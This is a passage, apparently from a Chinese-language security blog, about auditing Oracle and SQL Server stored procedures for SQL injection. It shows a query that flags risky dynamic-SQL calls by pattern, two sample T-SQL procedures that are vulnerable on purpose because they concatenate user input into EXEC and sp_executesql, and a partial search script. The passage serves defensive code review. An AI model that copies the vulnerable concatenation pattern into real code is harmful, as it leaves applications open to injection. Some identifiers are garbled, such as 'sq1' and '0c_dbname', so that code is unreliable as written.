&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%grant%to%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%alter%user%identified%by%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%execute%immediate%&#39;&#39;%||%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_%utility.exec_ddl_statement%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_ddl.create_wrapped%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_hs_pass_through.execute_immediate%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_hs_passthrough.parse%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%owa_util.bind_variables%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%owa_util.listprint%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%owa_ util.tableprint%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_sys_sq1.%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%ltadm.execsql%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_prvtaqim.execute_stmt%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_streams_rpc.execute_stmt%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_aqadm_sys.execute_stmt%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_streams_adm_utl.execute_ sql_ string%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%initjvmaux.exec%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_repcat_sql_utl.do_sql%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_aqadm_syscalls.kwqa3_gl_executestmt%&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;% wrapped%&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;owner&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;owner &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;obj ect_name &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;owner &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;OLAPSYS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;ORACLE_OCM&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;CTXSYS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;OUTLN&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SYSTEM&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;EXFSYS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;MDSYS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SYS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SYSMAN&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;WKSYS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;XDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;FLOWS_040000&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;FLOWS_030000&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;FLOWS_030100&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;	&lt;span class=&#34;token string&#34;&gt;&#39;FLOWS_020000&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;FLOWS_020100&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;FLOWS020000&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;FLOWS_010600&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;FLOWS_010500&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;FLOWS_010400&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;T-SQL&#34;&gt;&lt;a href=&#34;#T-SQL&#34; class=&#34;headerlink&#34; title=&#34;T-SQL&#34;&gt;&lt;/a&gt;T-SQL&lt;/h5&gt;&lt;p&gt;sp_helptext存储过程会显示用于在多行中创建对象的定义。每一行均包含了 T-SQL 定义的255个字符。该定义位于sys.sql_modules目录视图的definition列中。&lt;/p&gt;
&lt;p&gt;一个储存过程源代码&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_helptext SP_StoredProcedure&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt; SP_StoredProcedure &lt;span class=&#34;token variable&#34;&gt;@input&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; nvarchar&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SELECT field FROM table WHERE field =&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@input&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;&#39;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到@input变量来自用户直接输入与SQL字符串相连，产生SQL注入&lt;/p&gt;
&lt;p&gt;使用sp_executesql和EXEC()两条命令来调用动态SQL，sp_executesql是一个内置存储过程，接收两个预定义的参数和任意多个用户定义参数。第一个参数@stmt是强制参数，包含一条或一批 SQL语句。在SQL 7和SQL 2000中，@stmt的数据类型是ntext,在SQL Server 2005及之后 的版本中是nvarchar(MAX)。第二个参数@params是可选参数。EXEC()接收一个参数，该参数是一条要执行的SQL语句。它可以由字符串变量和字符串常量连接而成。&lt;/p&gt;
&lt;p&gt;下面是一个使用了 sp_executesql存储过程且易受到攻击的存储过程示例&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_helptext SP_StoredProcedure_II&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt; SP_StoredProcedure_II &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@input&lt;/span&gt; nvarchar&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; nvarchar&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SELECT field FROM table WHERE field =&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@input&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;&#39;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_executesql &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;列出所有储存过程&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysobjects &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;P&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;asc&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;利用脚本找到所有储存过程&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- Description: A T-SQL script to search the DB for potentially vulnerable &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- T-SQL code&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- @text - search string &#39;%text%&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- @dbname - database name, by default all databases will be searched&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;ALTER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;grep_sp&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@text&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;250&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;@dbname&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; NOCOUNT &lt;span class=&#34;token keyword&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@dbname&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- enumerate all databases.&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#db CURSOR FOR Select Name from master...sysdatabases declare 0c_dbname varchar(64)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;OPEN&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#db FETCH #db INTO @c_dbname&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@FETCH_STATUS&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt; grep_sp &lt;span class=&#34;token variable&#34;&gt;@text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@c_dbname&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FETCH&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#db INTO @c_dbname&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CLOSE&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#db DEALLOCATE #db&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;250&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- create the find like command&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;select &#39;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@dbname&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39; as db, o.name,m.definition&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;from &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@dbname&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.sys.sql_modules m &#39;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;inner join &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@dbname&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;...sysobjects o on
m.object_id=o.id&#39;&lt;/span&gt;
